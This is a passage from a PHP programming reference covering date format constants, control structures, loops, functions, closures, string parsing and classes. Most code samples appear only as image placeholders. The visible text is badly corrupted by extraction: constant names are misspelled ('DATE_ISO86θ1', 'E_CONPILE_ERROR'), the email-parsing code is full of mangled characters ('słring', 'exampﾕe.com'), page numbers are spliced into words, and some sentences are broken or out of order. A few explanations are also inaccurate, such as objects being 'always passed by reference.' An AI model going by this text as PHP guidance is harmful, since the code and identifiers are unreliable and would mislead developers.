Unfortunately this does not work with DateTime::createFromFormat() yet.

Section 18.3: Parse English date descriptions into a Date format

Using the strtotime() function combined with date() you can parse different English text descriptions to dates:

![](image_rsrcM36.jpg)

Section 18.4: Using Predefined Constants for Date Format

We can use Predefined Constants for Date format in date() instead of the conventional date format strings since PHP 5.1.0.

Predefined Date Format Constants Available

DATE\_ATOM \- Atom (2016-07-22T14:50:01+00:00)

DATE\_COOKIE \- HTTP Cookies (Friday, 22-Jul-16 14:50:01 UTC)

DATE\_RSS \- RSS (Fri, 22 Jul 2016 14:50:01 +0000)

DATE\_W3C \- World Wide Web Consortium (2016-07-22T14:50:01+00:00)

DATE\_ISO86θ1 \- ISO-8601 (2016-07-22T14:50:01+0000)

DATE\_RFC822 \- RFC 822 (Fri, 22 Jul 16 14:50:01 +0000)

DATE\_RFC85θ \- RFC 850 (Friday, 22-Jul-16 14:50:01 UTC)

DATE\_RFC1θ36 \- RFC 1036 (Fri, 22 Jul 16 14:50:01 +0000)

DATE\_RFC1123 \- RFC 1123 (Fri, 22 Jul 2016 14:50:01 +0000)

DATE\_RFC2822 \- RFC 2822 (Fri, 22 Jul 2016 14:50:01 +0000)

DATE\_RFC3339 \- Same as DATE\_ATOM (2016-07-22T14:50:01+00:00)

Usage Examples

![](image_rsrcM37.jpg)

![](image_rsrcM38.jpg)This will output: Fri, 22 Jul 16 14:50:01 +0000

![](image_rsrcM39.jpg)

![](image_rsrcM38.jpg)This will output: 1947-08-15T00:00:00+05:30

Chapter 19: Control Structures

Section 19.1: if else

The if statement in the example above allows to execute a code fragment, when the condition is met. When you want to execute a code fragment, when the condition is not met you extend the if with an else.

![](image_rsrcM3A.jpg)

PHP Manual - Control Structures - Else

The ternary operator as shorthand syntax for if-else

The ternary operator evaluates something based on a condition being true or not. It is a comparison operator and often used to express a simple if-else condition in a shorter form. It allows to quickly test a condition and often replaces a multi-line if statement, making your code more compact.

This is the example from above using a ternary expression and variable values: $a\=1; $b\=2;

![](image_rsrcM3B.jpg)

Outputs: a is NOT greater than b.

Section 19.2: Alternative s6ntax for control structures

PHP provides an alternative syntax for some control structures: if, while, for, foreach, and switch.

When compared to the normal syntax, the difference is, that the opening brace is replaced by a colon (:) and the closing brace is replaced by endif;, endwhile;, endfor;, endforeach;, or endswitch;, respectively. For individual examples, see the topic on alternative syntax for control structures.

![](image_rsrcM3C.jpg)

Multiple elseif statements using short-syntax:

![](image_rsrcM3D.jpg)

PHP Manual - Control Structures - Alternative Syntax

Section 19.3: while

while loop iterates through a block of code as long as a specified condition is true.

![](image_rsrcM3E.jpg)

Output:

123456789

For detailed information, see the Loops topic.

Section 19.4: do-while

do\-while loop first executes a block of code once, in every case, then iterates through that block of code as long as a specified condition is true.

![](image_rsrcM3F.jpg)

For detailed information, see the Loops topic.

Section 19.5: goto

The goto operator allows to jump to another section in the program. It's available since PHP 5.3.

The goto instruction is a goto followed by the desired target label: goto MyLabel;.

The target of the jump is specified by a label followed by a colon: MyLabel:.

This example will print Hello World!:

![](image_rsrcM3G.jpg)

Section 19.6: declare

declare is used to set an execution directive for a block of code. The following directives are recognized:

![](image_rsrcM3H.jpg)![](image_rsrcM3J.jpg)![](image_rsrcM3K.jpg)ticks encoding strict\_types

![](image_rsrcM3M.jpg)

To enable strict type mode, the declare statement is used with the strict\_types declaration:

![](image_rsrcM3N.jpg)

Section 19.7: include & require

require

require is similar to include, except that it will produce a fatal E\_CONPILE\_ERROR level error on failure. When the

require fails, it will halt the script. When the include fails, it will not halt the script and only emit E\_WARNING.

![](image_rsrcM3P.jpg)

PHP Manual - Control Structures - Require

include

![](image_rsrcKH6.jpg)The include statement includes and evaluates a file.

./variables.php

![](image_rsrcM3R.jpg)

![](image_rsrcKN7.jpg)./main.php\`

![](image_rsrcM3S.jpg)

Be careful with this approach, since it is considered a code smell, because the included file is altering amount and content of the defined variables in the given scope.

![](image_rsrcKN7.jpg)You can also include file, which returns a value. This is extremely useful for handling configuration arrays:

configuration.php

![](image_rsrcM3T.jpg)

![](image_rsrcKH6.jpg)main.php

![](image_rsrcM3U.jpg)

![](image_rsrcM3V.jpg)

This approach will prevent the included file from polluting your current scope with changed or added variables. PHP Manual - Control Structures - Include

include & require can also be used to assign values to a variable when returned something by file. Example :

include1.php file :

![](image_rsrcM3W.jpg)

index.php file :

![](image_rsrcM3X.jpg)

Section 19.8: return

The return statement returns the program control to the calling function.

When return is called from within a function, the execution of the current function will end.

![](image_rsrcM3Y.jpg)

When you run returnEndsFunctions(); you'll get the output This is executed;

When return is called from within a function with and argument, the execution of the current function will end and the value of the argument will be returned to the calling function.

Section 19.9: for

for loops are typically used when you have a piece of code which you want to repeat a given number of times.

![](image_rsrcM3Z.jpg)

Outputs:

123456789

For detailed information, see the Loops topic.

123

Section 19.10: foreach

foreach is a construct, which enables you to iterate over arrays and objects easily.

![](image_rsrcM40.jpg)

Outputs:

123

.

To use foreach loop with an object, it has to implement Iterator interface.

When you iterate over associative arrays:

![](image_rsrcM41.jpg)

Outputs:

color: red

For detailed information, see the Loops topic.

Section 19.11: if elseif else

elseif

elseif combines if and else. The if statement is extended to execute a different statement in case the original if expression is not met. But, the alternative expression is only executed, when the elseif conditional expression is met.

The following code displays either "a is bigger than b", "a is equal to b" or "a is smaller than b":

![](image_rsrcM42.jpg)

Several elseif statements

You can use multiple elseif statements within the same if statement:

![](image_rsrcM43.jpg)

![](image_rsrcM44.jpg)

Section 19.12: if

The if construct allows for conditional execution of code fragments.

![](image_rsrcM45.jpg)

PHP Manual - Control Structures - If

Section 19.13: switch

The switch structure performs the same function as a series of if statements, but can do the job in fewer lines of code. The value to be tested, as defined in the switch statement, is compared for equality with the values in each of the case statements until a match is found and the code in that block is executed. If no matching case statement is found, the code in the default block is executed, if it exists.

Each block of code in a case or default statement should end with the break statement. This stops the execution of the switch structure and continues code execution immediately afterwards. If the break statement is omitted, the next case statement's code is executed, even if there is no match. This can cause unexpected code execution if the break statement is forgotten, but can also be useful where multiple case statements need to share the same code.

![](image_rsrcM46.jpg)

In addition to testing fixed values, the construct can also be coerced to test dynamic statements by providing a boolean value to the switch statement and any expression to the case statement. Keep in mind the first matching value is used, so the following code will output "more than 100":

![](image_rsrcM47.jpg)

![](image_rsrcM48.jpg)

For possible issues with loose typing while using the switch construct, see Switch Surprises

126

Chapter 20: Loops

Loops are a fundamental aspect of programming. They allow programmers to create code that repeats for some given number of repetitions, or iterations. The number of iterations can be explicit (6 iterations, for example), or continue until some condition is met ('until Hell freezes over').

This topic covers the different types of loops, their associated control statements, and their potential applications in PHP.

Section 20.1: continue

![](image_rsrcKH6.jpg)The continue keyword halts the current iteration of a loop but does not terminate the loop.

Just like the break statement the continue statement is situated inside the loop body. When executed, the

continue statement causes execution to immediately jump to the loop conditional.

In the following example loop prints out a message based on the values in an array, but skips a specified value.

![](image_rsrcM49.jpg)

The expected output is:

![](image_rsrcM4A.jpg)

The continue statement may also be used to immediately continue execution to an outer level of a loop by specifying the number of loop levels to jump. For example, consider data such as

Fruit Color Cost Apple Red​1

Banana Yellow 7

Cherry Red​2

Grape Green 4

In order to only make pies from fruit which cost less than 5

![](image_rsrcM4B.jpg)

![](image_rsrcM4C.jpg)

When the continue 2 statement is executed, execution immediately jumps back to $data as $fruit continuing the outer loop and skipping all other code (including the conditional in the inner loop.

Section 20.2: break

![](image_rsrcM4D.jpg)The break keyword immediately terminates the current loop.

Similar to the continue statement, a break halts execution of a loop. Unlike a continue statement, however, break

causes the immediate termination of the loop and does not execute the conditional statement again.

![](image_rsrcM4E.jpg)

This code will produce

![](image_rsrcM4F.jpg)

but will not execute the case where $i is 0, which would result in a fatal error due to division by 0.

The break statement may also be used to break out of several levels of loops. Such behavior is very useful when executing nested loops. For example, to copy an array of strings into an output string, removing any # symbols, until the output string is exactly 160 characters

![](image_rsrcM4G.jpg)

The break 2 command immediately terminates executio1n2o8f both the inner and outer loops.

Section 20.3: foreach

![](image_rsrcM4H.jpg)The foreach statement is used to loop through arrays.

For each iteration the value of the current array element is assigned to $value variable and the array pointer is moved by one and in the next iteration next element will be processed.

The following example displays the items in the array assigned.

![](image_rsrcM4J.jpg)

The expected output is:

![](image_rsrcM4K.jpg)

You can also access the key / index of a value using foreach:

![](image_rsrcM4M.jpg)

By default $value is a copy of the value in $list, so changes made inside the loop will not be reflected in $list

afterwards.

![](image_rsrcM4N.jpg)

To modify the array within the foreach loop, use the & operator to assign $value by reference. It's important to

unset the variable afterwards so that reusing $value elsewhere doesn't overwrite the array.

![](image_rsrcM4P.jpg)

You can also modify the array items within the foreach loop by referencing the array key of the current item.

![](image_rsrcM4R.jpg)

Section 20.4: do...while

![](image_rsrcM4S.jpg)129

![](image_rsrcKX3.jpg)The do...while statement will execute a block of code at least once - it then will repeat the loop as long as a condition is true.

The following example will increment the value of $i at least once, and it will continue incrementing the variable $i

as long as it has a value of less than 25;

![](image_rsrcM4T.jpg)

The expected output is:

![](image_rsrcM4U.jpg)

Section 20.5: for

![](image_rsrcKNA.jpg)The for statement is used when you know how many times you want to execute a statement or a block of statements.

The initializer is used to set the start value for the counter of the number of loop iterations. A variable may be declared here for this purpose and it is traditional to name it $i.

The following example iterates 10 times and displays numbers from 0 to 9.

![](image_rsrcM4V.jpg)

The expected output is:

![](image_rsrcM4W.jpg)

Section 20.6: while

![](image_rsrcM4H.jpg)The while statement will execute a block of code if and as long as a test expression is true.

If the test expression is true then the code block will be executed. After the code has executed the test expression will again be evaluated and the loop will continue until the test expression is found to be false.

The following example iterates till the sum reaches 100 before terminating.

![](image_rsrcM4X.jpg)

The expected output is:

![](image_rsrcM4Y.jpg)

Chapter 21: Functions

Section 21.1: Variable-length argument lists

Version ≥ 5.6

PHP 5.6 introduced variable-length argument lists (a.k.a. varargs, variadic arguments), using the ... token before the argument name to indicate that the parameter is variadic, i.e. it is an array including all supplied parameters from that one onward.

![](image_rsrcM4Z.jpg)

Type names can be added in front of the ...:

![](image_rsrcM50.jpg)

The & reference operator can be added before the ..., but after the type name (if any). Consider this example:

![](image_rsrcM51.jpg)

Output:

![](image_rsrcM52.jpg)

On the other hand, an array (or Traversable) of arguments can be unpacked to be passed to a function in the form of an argument list:

![](image_rsrcM53.jpg)

Output:

![](image_rsrcM54.jpg)

Compare with this snippet without using ...:

![](image_rsrcM55.jpg)

Output:

![](image_rsrcM56.jpg)

Therefore, redirect functions for variadic functions can now be easily made, for example:

![](image_rsrcM57.jpg)

Apart from arrays, Traversables, such as Iterator (especially many of its subclasses from SPL) can also be used. For example:

![](image_rsrcM58.jpg)

If the iterator iterates infinitely, for example:

![](image_rsrcM59.jpg)

Different versions of PHP behave differently: From PHP 7.0.0 up to PHP 7.1.0 (beta 1):

![](image_rsrcM5A.jpg)![](image_rsrcM5B.jpg)A segmentation fault will occur

![](image_rsrcM5C.jpg)![](image_rsrcM5D.jpg)The PHP process will exit with code 139 In PHP 5.6:

![](image_rsrcM5E.jpg)A fatal error of memory exhaustion ("Allowed memory size of %d bytes exhausted") will be shown. The PHP process will exit with code 255

![](image_rsrcM5F.jpg)

Note: HHVM (v3.10 - v3.12) does not support unpacking Traversables. A warning message "Only containers may be unpacked" will be shown in this attempt.

![](image_rsrcKNA.jpg)Section 21.2: Optional Parameters

Functions can have optional parameters, for example:

![](image_rsrcM5G.jpg)

![](image_rsrcM5H.jpg)

Section 21.3: Passing Arguments b6 Reference

Function arguments can be passed "By Reference", allowing the function to modify the variable used outside the function:

![](image_rsrcM5J.jpg)

Object arguments are always passed by reference:

![](image_rsrcM5K.jpg)

To avoid implicit passing an object by reference, you should clone the object.

Passing by reference can also be used as an alternative way to return parameters. For example, the

socket\_getpeername function:

![](image_rsrcM5M.jpg)

This method actually aims to return the address and port of the peer, but since there are two values to return, it chooses to use reference parameters instead. It can be called like this:

![](image_rsrcM5N.jpg)

The variables $address and $port do not need to be defined before. They will:

1.  be defined as null first,

2.  then passed to the function with the predefined null value

3.  then modified in the function

4.  end up defined as the address and port in the calling context.

Section 21.4: Basic Function Usage

A basic function is defined and executed like this:

![](image_rsrcM5P.jpg)

Section 21.5: Function Scope

Variables inside functions is inside a local scope like this

![](image_rsrcM5R.jpg)

Chapter 22: Functional Programming

PHP's functional programming relies on functions. Functions in PHP provide organized, reusable code to perform a set of actions. Functions simplify the coding process, prevent redundant logic, and make code easier to follow. This topic describes the declaration and utilization of functions, arguments, parameters, return statements and scope in PHP.

Section 22.1: Closures

A closure is an anonymous function that can't access outside scope.

When defining an anonymous function as such, you're creating a "namespace" for that function. It currently only has access to that namespace.

![](image_rsrcM5S.jpg)

![](image_rsrcM5T.jpg)It doesn't have access to any external variables. To grant this permission for this namespace to access external variables, you need to introduce it via closures (use()).

![](image_rsrcM5U.jpg)

This is heavily attributed to PHP's tight variable scoping - If a variable isn't defined within the scope, or isn't brought in

![](image_rsrcM5V.jpg)with​then it does not exist.

![](image_rsrcKNA.jpg)Also note:

Inheriting variables from the parent scope is not the same as using global variables. Global variables exist in the global scope, which is the same no matter what function is executing.

![](image_rsrcKNA.jpg)The parent scope of a closure is the function in which the closure was declared (not necessarily the function it was called from).

Taken from the PHP Documentation for Anonymous Functions

In PHP, closures use an early-binding approach. This means that variables passed to the closure's namespace using use keyword will have the same values when the closure was defined.

To change this behavior you should pass the variable by-reference.

![](image_rsrcM5W.jpg)

![](image_rsrcM5X.jpg)

Default arguments are not implicitly required when defining anonymous functions with/without closures.

![](image_rsrcM5Y.jpg)

Section 22.2: Assignment to variables

Anonymous functions can be assigned to variables for use as parameters where a callback is expected:

![](image_rsrcM5Z.jpg)

These variables can also be used as standalone function calls:

![](image_rsrcM60.jpg)

Section 22.3: Objects as a function

![](image_rsrcM61.jpg)

An object with an  invoke method can be used exactly as any other function.

The  invoke method will have access to all properties o1f 3th7e object and will be able to call any methods.

Section 22.4: Using outside variables

The use construct is used to import variables into the anonymous function's scope:

![](image_rsrcM62.jpg)

Variables can also be imported by reference:

![](image_rsrcM63.jpg)

Section 22.5: Anon6mous function

An anonymous function is just a function that doesn't have a name.

![](image_rsrcM64.jpg)

In PHP, an anonymous function is treated like an expression and for this reason, it should be ended with a semicolon ;.

An anonymous function should be assigned to a variable.

![](image_rsrcM65.jpg)

Or it should be passed as parameter of another function.

![](image_rsrcM66.jpg)

![](image_rsrcM67.jpg)

Or even been returned from another function.

Self-executing anonymous functions:

![](image_rsrcM68.jpg)

Passing an argument into self-executing anonymous functions:

![](image_rsrcM69.jpg)

Section 22.6: Pure functions

A pure function is a function that, given the same input, will always return the same output and are side-effect free.

![](image_rsrcM6A.jpg)

Some side-effects are changing the filesystem, interacting with databases, printing to the screen.

![](image_rsrcM6B.jpg)

Section 22.7: Common functional methods in PHP

Mapping

Applying a function to all elements of an array:

![](image_rsrcM6C.jpg)

Be aware that this is the only method of the list where the callback comes first.

Reducing (or folding)

Reducing an array to a single value:

![](image_rsrcM6D.jpg)

Filtering

Returns only the array items for which the callback returns true:

![](image_rsrcM6E.jpg)

Section 22.8: Using built-in functions as callbacks

In functions taking callable as an argument, you can also put a string with PHP built-in function. It's common to use trim as array\_map parameter to remove leading and trailing whitespace from all strings in the array.

![](image_rsrcM6F.jpg)

Section 22.9: Scope

In PHP, an anonymous function has its own scope like any other PHP function.

In JavaScript, an anonymous function can access a variable in outside scope. But in PHP, this is not permitted.

![](image_rsrcM6G.jpg)

Section 22.10: Passing a callback function as a parameter

There are several PHP functions that accept user-defined callback functions as a parameter, such as:

call\_user\_func(), usort() and array\_map().

![](image_rsrcM6H.jpg)

Depending on where the user-defined callback function was defined there are different ways to pass them:

![](image_rsrcM6J.jpg)

![](image_rsrcM6K.jpg)Object Oriented style:

Object Oriented style using a static method:

![](image_rsrcM6M.jpg)

Chapter 23: Alternative S6ntax for Control Structures

Section 23.1: Alternative if/else statement

![](image_rsrcM6N.jpg)

Section 23.2: Alternative for statement

![](image_rsrcM6P.jpg)

Section 23.3: Alternative while statement

![](image_rsrcM6R.jpg)

Section 23.4: Alternative foreach statement

![](image_rsrcM6S.jpg)

![](image_rsrcM6T.jpg)

Section 23.5: Alternative switch statement

![](image_rsrcM6U.jpg)

143

Chapter 24: String formatting

Section 24.1: String interpolation

You can also use interpolation to interpolate (insert) a variable within a string. Interpolation works in double quoted strings and the heredoc syntax only.

![](image_rsrcM6V.jpg)

The complex (curly) syntax format provides another option which requires that you wrap your variable within curly braces {}. This can be useful when embedding variables within textual content and helping to prevent possible ambiguity between textual content and variables.

![](image_rsrcM6W.jpg)

The {} syntax only interpolates variables starting with a $ into a string. The {} syntax does not evaluate arbitrary PHP expressions.

![](image_rsrcM6X.jpg)

However, the {} syntax does evaluate any array access, property access and function/method calls on variables, array elements or properties:

![](image_rsrcM6Y.jpg)

![](image_rsrcM6Z.jpg)

Notice that the dollar $ sign can appear after the opening curly brace { as the above examples, or, like in Perl or Shell Script, can appear before it:

![](image_rsrcM70.jpg)

![](image_rsrcM71.jpg)The Complex (curly) syntax is not called as such because it's complex, but rather because it allows for the use of 'complex expressions'. Read more about Complex (curly) syntax

Section 24.2: Extracting/replacing substrings

Single characters can be extracted using array (square brace) syntax as well as curly brace syntax. These two syntaxes will only return a single character from the string. If more than one character is needed, a function will be required, i.e.- substr

Strings, like everything in PHP, are θ\-indexed.

![](image_rsrcM72.jpg)

Strings can also be changed one character at a time using the same square brace and curly brace syntax. Replacing more than one character requires a function, i.e.- substr\_replace

![](image_rsrcM73.jpg)

![](image_rsrcM74.jpg)

Chapter 25: String Parsing

Section 25.1: Splitting a string b6 separators

explode and strstr are simpler methods to get substrings by separators.

A string containing several parts of text that are separated by a common character can be split into parts with the

explode function.

![](image_rsrcM75.jpg)

The method also supports a limit parameter that can be used as follow:

![](image_rsrcM76.jpg)

If the limit parameter is zero, then this is treated as 1.

![](image_rsrcM77.jpg)

If limit is set and positive, the returned array will contain a maximum of limit elements with the last element containing the rest of string.

![](image_rsrcM78.jpg)

If the limit parameter is negative, all components except the last \-limit are returned.

![](image_rsrcM79.jpg)

explode can be combined with list to parse a string into variables in one line:

![](image_rsrcM7A.jpg)

However, make sure that the result of explode contains enough elements, or an undefined index warning would be triggered.

strstr strips away or only returns the substring before the first occurrence of the given needle.

![](image_rsrcM7B.jpg)

Section 25.2: Substring

Substring returns the portion of string specified by the start and length parameters.

![](image_rsrcM7C.jpg)

If there is a possibility of meeting multi-byte character strings, then it would be safer to use mb\_substr.

![](image_rsrcM7D.jpg)

Another variant is the substr\_replace function, which replaces text within a portion of a string.

![](image_rsrcM7E.jpg)

Let's say you want to find a specific word in a string - and don't want to use Regex.

![](image_rsrcM7F.jpg)

Another option is a very basic parsing of an email.

![](image_rsrcM7G.jpg)$email \= "[test@example.com](mailto:test@example.com)";

$wrong \= "foobar.co.uk";

$notld \= "foo@bar";

$at \= strpos($email, "@"); // inł(4)

$wat \= strpos($wrong, "@"); // booﾕ(faﾕse)

$nat \= strpos($notld , "@"); // inł(3)

$domain \= substr($email, $at + 1); // słring(11) "exampﾕe.com"

$womain \= substr($wrong, $wat \+ 1); // słring(11) "oobar.co.uk"

$nomain \= substr($notld, $nat + 1); // słring(3) "bar"

$dot \= strpos($domain, "."); // inł(7)

$wot \= strpos($womain, "."); // inł(5)

$not \= strpos($nomain, "."); // booﾕ(faﾕse)

$tld \= substr($domain, $dot + 1); // słring(3) "com"

$wld \= substr($womain, $wot \+ 1); // słring(5) "co.uk"

$nld \= substr($nomain , $not \+ 1); // słring(2) "ar"

// słring(25) "[łesł@exampﾕe.com](mailto:łesł@exampﾕe.com) is vaﾕid"

if ($at && $dot) var\_dump("‡email is valid");

else var\_dump("‡email is invalid");

// słring(21) "foobar.com is invaﾕid"

if ($wat && $wot) var\_dump("‡wrong is valid"); else var\_dump("‡wrong is invalid");

// słring(18) "foo@bar is invaﾕid"

if ($nat && $not) var\_dump("‡notld is valid"); else var\_dump("‡notld is invalid");

// słring(27) "foobar.co.uk is an UK emaiﾕ"

if ($tld \== "co.uk") var\_dump("‡email is a UK ad1d4re8ss");

![](image_rsrcM7H.jpg)

Or even putting the "Continue reading" or "..." at the end of a blurb

![](image_rsrcM7J.jpg)

Section 25.3: Searching a substring with strpos

strpos can be understood as the number of bytes in the haystack before the first occurrence of the needle.

![](image_rsrcM7K.jpg)

Checking if a substring exists

Be careful with checking against TRUE or FALSE because if a index of 0 is returned an if statement will see this as FALSE.

![](image_rsrcM7M.jpg)

Output of the whole example:

![](image_rsrcM7N.jpg)

Search starting from an offset

![](image_rsrcM7P.jpg)

![](image_rsrcM7R.jpg)

![](image_rsrcM7S.jpg)Get all occurrences of a substring

Section 25.4: Parsing string using regular expressions

preg\_match can be used to parse string using regular expression. The parts of expression enclosed in parenthesis are called subpatterns and with them you can pick individual parts of the string.

![](image_rsrcM7T.jpg)

Output

![](image_rsrcM7U.jpg)

150

Chapter 26: Classes and Objects

Classes and Objects are used to to make your code more efficient and less repetitive by grouping similar tasks.

A class is used to define the actions and data structure used to build objects. The objects are then built using this predefined structure.

Section 26.1: Class Constants

Class constants provide a mechanism for holding fixed values in a program. That is, they provide a way of giving a name (and associated compile-time checking) to a value like 3.14 or "Apple". Class constants can only be defined with the const keyword - the define function cannot be used in this context.

![](image_rsrcM7V.jpg)As an example, it may be convenient to have a shorthand representation for the value of throughout a program. A class with const values provides a simple way to hold such values.

![](image_rsrcM7W.jpg)

Class constants may be accessed by using the double colon operator (so-called the scope resolution operator) on a class, much like static variables. Unlike static variables, however, class constants have their values fixed at compile time and cannot be reassigned to (e.g. MathValues::PI \= 7 would produce a fatal error).

Class constants are also useful for defining things internal to a class that might need changing later (but do not change frequently enough to warrant storing in, say, a database). We can reference this internally using the self scope resolutor (which works in both instanced and static implementations)

![](image_rsrcM7X.jpg)

Class constants can only contain scalar values in versions < 5.6

As of PHP 5.6 we can use expressions with constants, meaning math statements and strings with concatenation are acceptable constants

![](image_rsrcM7Y.jpg)

As of PHP 7.0, constants declared with define may now contain arrays.

![](image_rsrcM7Z.jpg)

Class constants are useful for more than just storing mathematical concepts. For example, if preparing a pie, it might be convenient to have a single Pie class capable of taking different kinds of fruit.

![](image_rsrcM80.jpg)

We can then use the Pie class like so

![](image_rsrcM81.jpg)

The problem that arises here is, when instantiating the Pie class, no guidance is provided as to the acceptable values. For example, when making a "boysenberry" pie, it might be misspelled "boisenberry". Furthermore, we might not support a plum pie. Instead, it would be useful to have a list of acceptable fruit types already defined somewhere it would make sense to look for them. Say a class named Fruit:

![](image_rsrcM82.jpg)

Listing the acceptable values as class constants provides a valuable hint as to the acceptable values which a method accepts. It also ensures that misspellings cannot make it past the compiler. While new Pie('aple') and new Pie('apple') are both acceptable to the compiler, new Pie(Fruit::APLE) will produce a compiler error.

Finally, using class constants means that the actual value of the constant may be modified in a single place, and any code using the constant automatically has the effects of the modification.

Whilst the most common method to access a class constant is MyClass::CONSTANT\_NAME, it may also be accessed by:

![](image_rsrcM83.jpg)

Class constants in PHP are conventionally named all in uppercase with underscores as word separators, although any valid label name may be used as a class constant name.

As of PHP 7.1, class constants may now be defined with different visibilities from the default public scope. This means that both protected and private constants can now be defined to prevent class constants from unnecessarily leaking into the public scope (see Method and Property Visibility ). For example:

class Something {

![](image_rsrcM84.jpg)

define vs class constants

Although this is a valid construction:

![](image_rsrcM85.jpg)

If you try to do the same with class constants, you'll get an error:

![](image_rsrcM86.jpg)

But you can do:

![](image_rsrcM87.jpg)

For more information, see constants in the manual.

Using ::class to retrieve class's name

PHP 5.5 introduced the ::class syntax to retrieve the full class name, taking namespace scope and use statements into account.

![](image_rsrcM88.jpg)

The above works even if the classes are not even defined (i.e. this code snippet works alone).

This syntax is useful for functions that require a class name. For example, it can be used with class\_exists to check a class exists. No errors will be generated regardless of return value in this snippet:

![](image_rsrcM89.jpg)

Section 26.2: Abstract Classes

An abstract class is a class that cannot be instantiated. Abstract classes can define abstract methods, which are methods without any body, only a definition:

![](image_rsrcM8A.jpg)

Abstract classes should be extended by a child class which can then provide the implementation of these abstract methods.

The main purpose of a class like this is to provide a kind of template that allows children classes to inherit from, "forcing" a structure to adhere to. Lets elaborate on this with an example:

In this example we will be implementing a Worker interface. First we define the interface:

![](image_rsrcM8B.jpg)

To ease the development of further Worker implementations, we will create an abstract worker class that already provides the run() method from the interface, but specifies some abstract methods that need to be filled in by any child class:

![](image_rsrcM8C.jpg)

First of all, we have provided an abstract method getMemoryLimit(). Any class extending from AbstractWorker needs to provide this method and return its memory limit. The AbstractWorker then sets the memory limit and logs it.

called.

Finally, all of these method calls have been grouped in a try\-catch block. So if any of the abstract methods defined by the child class throws an exception, we will catch that exception, log it and rethrow it. This prevents all child classes from having to implement this themselves.

Now lets define a child class that extends from the AbstractWorker:

![](image_rsrcM8D.jpg)

As you can see, the TransactionProcessorWorker was rather easy to implement, as we only had to specify the memory limit and worry about the actual actions that it needed to perform. No error handling is needed in the TransactionProcessorWorker because that is handled in the AbsractWorker.

![](image_rsrcM8E.jpg)Important Note

When inheriting from an abstract class, all methods marked abstract in the parent's class declaration must be defined by the child (or the child itself must also be marked abstract); additionally, these methods must be defined with the same (or a less restricted) visibility. For example, if the abstract method is defined as protected, the function implementation must be defined as either protected or public, but not private.

Taken from the PHP Documentation for Class Abstraction.

![](image_rsrcM71.jpg)If you do not define the parent abstract classes methods within the child class, you will be thrown a Fatal PHP Error like the following.

Fatal error: Class X contains 1 abstract method and must therefore be declared abstract or implement the remaining methods (X::x) in

Section 26.3: Late static binding

from. It was added to overcome the problem inherent with the self:: scope resolutor. Take the following code

![](image_rsrcM8F.jpg)

You would expect that the MrEd class will override the parent whatToSay() function. But when we run this we get something unexpected

![](image_rsrcM8G.jpg)

The problem is that self::whatToSay(); can only refer to the Horse class, meaning it doesn't obey MrEd. If we switch to the static:: scope resolutor, we don't have this problem. This newer method tells the class to obey the instance calling it. Thus we get the inheritance we're expecting

![](image_rsrcM8H.jpg)

Section 26.4: Namespacing and Autoloading

Technically, autoloading works by executing a callback when a PHP class is required but not found. Such callbacks usually attempt to load these classes.

Generally, autoloading can be understood as the attempt to load PHP files (especially PHP class files, where a PHP source file is dedicated for a specific class) from appropriate paths according to the class's fully-qualified name (FQN) when a class is needed.

Suppose we have these classes:

Class file for application\\controllers\\Base:

![](image_rsrcM8J.jpg)

Class file for application\\controllers\\Control:

![](image_rsrcM8K.jpg)

Class file for application\\models\\Page:

![](image_rsrcM8M.jpg)

Under the source folder, these classes should be placed at the paths as their FQNs respectively:

![](image_rsrcM8N.jpg)Source folder

applications

![](image_rsrcM8P.jpg)

![](image_rsrcKKY.jpg)controllers

![](image_rsrcM8R.jpg)![](image_rsrcM8S.jpg)Base.php Control.php

![](image_rsrcKKY.jpg)models

![](image_rsrcM8T.jpg)Page.php

This approach makes it possible to programmatically resolve the class file path according to the FQN, using this function:

![](image_rsrcM8U.jpg)

The spl\_autoload\_register function allows us to load a class when needed using a user-defined function:

![](image_rsrcM8V.jpg)

This function can be further extended to use fallback methods of loading:

![](image_rsrcM8W.jpg)

![](image_rsrcM8X.jpg)

Note that PHP doesn't attempt to load the classes whenever a file that uses this class is loaded. It may be loaded in the middle of a script, or even in shutdown functions . This is one of the reasons why developers, especially those who use autoloading, should avoid replacing executing source files in the runtime, especially in phar files.

Section 26.5: Method and Propert6 Visibilit6

There are three visibility types that you can apply to methods (class/object functions) and properties (class/object variables) within a class, which provide access control for the method or property to which they are applied.

You can read extensively about these in the PHP Documentation for OOP Visibility.

Public

Declaring a method or a property as public allows the method or property to be accessed by:

![](image_rsrcM8Y.jpg)The class that declared it.

![](image_rsrcM8Z.jpg)The classes that extend the declared class.

![](image_rsrcM90.jpg)Any external objects, classes, or code outside the class hierarchy.

An example of this public access would be:

![](image_rsrcM91.jpg)

Protected

Declaring a method or a property as protected allows the method or property to be accessed by:

![](image_rsrcM92.jpg)The class that declared it.

![](image_rsrcM93.jpg)The classes that extend the declared class.

This does not allow external objects, classes, or code outside the class hierarchy to access these methods or properties. If something using this method/property does not have access to it, it will not be available, and an error will be thrown. Only instances of the declared self (or subclasses thereof) have access to it.

An example of this protected access would be:

![](image_rsrcM94.jpg)

![](image_rsrcM95.jpg)

![](image_rsrcM96.jpg)The example above notes that you can only access the the house can only be access from inside the house."

Private

elements within it's own scope. Essentially: "What's in

![](image_rsrcM97.jpg)Declaring a method or a property as private allows the method or property to be accessed by: The class that declared it Only (not subclasses).

A private method or property is only visible and accessible within the class that created it.

Note that objects of the same type will have access to each others private and protected members even though they are not the same instances.

![](image_rsrcM98.jpg)

![](image_rsrcM99.jpg)

![](image_rsrcM9A.jpg)As noted, you can only access the​method/property from within it's defined class.

Section 26.6: Interfaces

Introduction

Interfaces are definitions of the public APIs classes must implement to satisfy the interface. They work as "contracts", specifying what a set of subclasses does, but not how they do it.

Interface definition is much alike class definition, changing the keyword class to interface:

![](image_rsrcM9B.jpg)

Interfaces can contain methods and/or constants, but no attributes. Interface constants have the same restrictions as class constants. Interface methods are implicitly abstract:

![](image_rsrcM9C.jpg)

Note: interfaces must not declare constructors or destructors, since these are implementation details on the class level.

Realization

Any class that needs to implement an interface must do so using the implements keyword. To do so, the class needs to provide a implementation for every method declared in the interface, respecting the same signature.

A single class can implement more than one interface at a time.

![](image_rsrcM9D.jpg)

![](image_rsrcM9E.jpg)

When abstract classes implement interfaces, they do not need to implement all methods. Any method not implemented in the base class must then be implemented by the concrete class that extends it:

![](image_rsrcM9F.jpg)

![](image_rsrcM9G.jpg)Notice that interface realization is an inherited characteristic. When extending a class that implements an interface, you do not need to redeclare it in the concrete class, because it is implicit.

Note: Prior to PHP 5.3.9, a class could not implement two interfaces that specified a method with the same name, since it would cause ambiguity. More recent versions of PHP allow this as long as the duplicate methods have the same signature\[1\].

Inheritance

Like classes, it is possible to establish an inheritance relationship between interfaces, using the same keyword

